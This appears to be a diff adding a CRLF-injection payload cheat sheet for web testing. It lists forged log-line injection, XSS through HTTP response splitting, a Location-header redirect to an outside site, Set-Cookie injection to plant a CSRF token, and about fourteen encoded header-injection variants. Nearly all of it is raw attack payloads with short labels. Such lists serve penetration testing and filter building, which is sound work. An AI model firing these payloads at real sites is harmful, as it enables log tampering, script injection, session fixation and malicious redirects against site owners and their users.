@@ -1,1 +1,26 @@
 sample of impact injected local host fake pah injected in logs=/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
+=====================================================================
+XSS through HTTP Response Splitting
+X-Custom-Header: UserInput=Value%0d%0a%0d%0a<script>alert('XSS')</script>
+==========================================================================
+HTTP Response Splitting leading to Redirect.
+/%0d%0aLocation:%20http://myweb.com -try in get request in browser or URL- Notice the response containing location header
+=====================================================
+%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; -- SETTING TOKEN ,and ab;le to change the existing header policy
+==================================================
+Header-based test, site root
+%0d%0aheader:header
+%0d%0aheader:header
+%0aheader:header
+%0dheader:header
+%23%0dheader:header
+%3f%0dheader:header
+/%250aheader:header
+/%25250aheader:header
+/%%0a0aheader:header
+/%3f%0dheader:header
+/%23%0dheader:header
+/%25%30aheader:header
+/%25%30%61header:header
+/%u000aheader:header
+==================================================================
